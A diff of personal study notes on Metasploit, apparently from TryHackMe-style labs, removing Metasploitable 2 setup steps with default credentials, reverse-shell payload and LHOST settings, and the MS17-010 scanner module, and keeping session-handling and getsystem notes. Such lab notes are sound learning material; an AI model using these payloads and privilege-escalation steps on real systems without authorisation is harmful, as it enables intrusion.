@@ -62,47 +62,11 @@ https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
 
 ## metasploit
 
-* vm2
-  * https://docs.rapid7.com/metasploit/metasploitable-2/
-  * msfadmin:msfadmin
-  * sudo loadkeys fr
-  * VBox: use existing drive
-  * C:\Program Files (x86)\VMware\VMware Player\OVFTool> .\ovftool.exe "Metasploitable.vmx"  "export.ovf"
-  * https://windowsloop.com/convert-vmware-to-virtualbox/
-  * 2 processors
-  * https://www.vulnhub.com/entry/metasploitable-2,29/
-  * File > Tools > Network manager (add)
-    * add to each VM instead of Nat in network
-* "Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:" `set payload windows/x64/shell/reverse_tcp`
-* https://help.tryhackme.com/106141-openvpn/606073-openvpn-general-troubleshooting
-* `set LHOST tun0`
-* `auxiliary/scanner/smb/smb_ms17_010` to verify that it is vulnerable
-  * Modules
-    * Encoders
-    * Evasion
-    * Exploits
-    * NOPs
-    * Payloads
-      * single/inline: generic/shell_reverse_tcp
-      * not inline= staged: shell"/"reverse_tcp
-    * Post
-* `show payloads`
-* `set payload 1`
-  * Payloads are the code that will run on the target.
-* "the tab key"
-* info
-
-![](_images/img.png)
-
-* https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
-* search type:auxiliary platform:
 * `exploit -z` in the background
 * background/CTRL+Z to background sessions
   * sessions
   * sessions -i <id>
 * shell to meterpreter (seems useless in msf6)
-  * `post/multi/manage/shell_to_meterpreter`
-  * session
   * `shell`
     * `whoami`
   * `getsystem`
